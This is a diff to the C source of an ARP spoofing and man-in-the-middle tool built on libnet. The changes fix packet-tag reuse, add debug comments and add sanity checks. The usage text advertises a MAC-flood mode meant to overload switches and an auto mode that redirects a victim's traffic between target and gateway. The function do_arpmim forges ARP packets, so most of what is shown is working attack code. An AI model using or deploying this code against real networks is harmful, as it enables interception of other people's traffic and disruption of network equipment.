@@ -64,6 +64,8 @@ struct _opt {
 	unsigned long int (*getnextipmac) (void *);
 	unsigned long int (*resetipmac) (void *);
 	libnet_t *lnctx;
+	libnet_ptag_t lnptagArp;
+	libnet_ptag_t lnptagEth;
 	FILE *flfd;	/* Filelist FD */
 } opt;
 
@@ -107,6 +109,7 @@ init_argvlist(char *argv[])
 
         while (avl.argvlist[avl.len] != NULL)
                 avl.len++;
+	//DEBUGF("init(): AVL.LEN %d, AVL.POS %d\n", avl.len, avl.pos);
 
 	return (0);
 }
@@ -114,10 +117,15 @@ init_argvlist(char *argv[])
 unsigned long int
 getnext_argvlist(struct _ipmac *ipmac)
 {
+	//DEBUGF("next(): avl.pos %d\n", avl.pos);
 	if (avl.pos >= avl.len)
-		return(-1);
+	{
+		//DEBUGF("avl.pos %d > avl.lne %d\n", avl.pos, avl.len);
+		return -1;
+	}
 
-	str2ipmac(avl.argvlist[avl.pos++], ipmac);
+	str2ipmac(avl.argvlist[avl.pos], ipmac);
+	avl.pos++;
 	return (0);
 }
 
@@ -248,12 +256,12 @@ usage(int code, char *string)
 " -l <iprange>	: generate ip-list [73.50.0.0-73.50.31.255]\n"
 " -f <file>	: read ip's[/:mac's] from file\n"
 " -w <n ms>	: wait n ms between each packet [default=4sec]\n"
-" -m		: macoff (macflood, elite switch -> lame hub)\n"
+" -m		: mac-flood. Overloads the switch and turns it into a hub.\n"
 " -r		: use ARPOP_REQUEST [default=ARPOP_REPLY]\n"
 " -a		: asymmetric\n"
 " -A		: reverse asymmetric\n"
 " -v		: verbose output [-vv..vv for more]\n"
-" -t <ip>	: AUTO MODE: Redirect 'ip'\n"
+" -t <ip>	: AUTO MODE: Redirect target IP<->GW\n"
 "\n"
 "Example (AUTO MODE):\n"
 "AUTO MODE: Redirect victim=10.0.1.2"
@@ -461,19 +469,17 @@ init_spreadset(struct _srdnfo *srdnfo, u_long start_ip, u_long end_ip)
 int
 do_arpmim(uint8_t *mymac, struct _ipmac *src, struct _ipmac *dst)
 {
-	libnet_ptag_t ptag = 0;
-
-	ptag = libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP,
+	opt.lnptagArp = libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP,
 	                 6, 4, opt.arpop,
 	                 mymac,
         	         (unsigned char *)&src->ip,
                 	 dst->mac,
 	                 (unsigned char *)&dst->ip, 
-	                 NULL, 0, opt.lnctx, ptag);
+	                 NULL, 0, opt.lnctx, opt.lnptagArp);
 
-	ptag = libnet_build_ethernet(dst->mac,
+	opt.lnptagEth = libnet_build_ethernet(dst->mac,
 	                      mymac,
-        	              ETHERTYPE_ARP, NULL, 0, opt.lnctx, 0);
+        	              ETHERTYPE_ARP, NULL, 0, opt.lnctx, opt.lnptagEth);
 
 	libnet_write(opt.lnctx);
 
@@ -497,7 +503,7 @@ static int
 GetRemoteMac(unsigned long ip, unsigned char *mac)
 {
 	int ret;
-	libnet_ptag_t ptag;
+	libnet_ptag_t ptag = 0;
 
 	/*
 	 * First see if an entry exists already...
@@ -508,7 +514,6 @@ GetRemoteMac(unsigned long ip, unsigned char *mac)
 
 	/* Victim's MAC entry does not exist in ARP table. Lets poke it */
 	/* Send ARP request for victim's IP */
-
 	ptag = libnet_autobuild_arp(ARPOP_REQUEST,
 			opt.mymac,
 			(uint8_t *)"\x0\x0\x0\x0",
@@ -517,6 +522,7 @@ GetRemoteMac(unsigned long ip, unsigned char *mac)
 			opt.lnctx);
 	if (ptag <= 0)
 		ERREXIT("libnet_build_arp() failed.\n");
+
 	ptag = libnet_build_ethernet((u_int8_t *)"\xff\xff\xff\xff\xff\xff", opt.mymac, ETHERTYPE_ARP, NULL, 0, opt.lnctx, 0);
 	if (ptag <= 0)
 		ERREXIT("libnet_build_ethernet() failed.\n");
@@ -538,6 +544,7 @@ main(int argc, char *argv[])
 {
 	struct _ipmac ipmac;
 	char *argz[3];
+	char buf[128];
 
 	init_vars();
 
@@ -591,7 +598,6 @@ main(int argc, char *argv[])
 		/*
 		 * Place info into internal structure so that the old loop can send out arps....
 		 */
-		char buf[128];
 		snprintf(buf, sizeof buf, "%s:%s", inet_ntoa(opt.gw_addr), mac2str(mac_gw));
 		str2ipmac(buf, &opt.trgt);
 
@@ -609,8 +615,13 @@ main(int argc, char *argv[])
 			if (opt.resetipmac(NULL) != 0)
 				die(EXIT_FAILURE, "unable to reset ipmac list");
 
-			opt.getnextipmac(&ipmac);
+			if (opt.getnextipmac(&ipmac) == -1)
+				ERREXIT("FATAL: No ip's???\n");
 		}
+		if (opt.trgt.ip == 4294967295)
+			ERREXIT("Target is 255...arg!\n");
+		if (ipmac.ip  == 4294967295)
+			ERREXIT("ipmac... is 255...arg!\n");
 
 		if (!(opt.flags & OPT_FL_REVASYM))
 		{
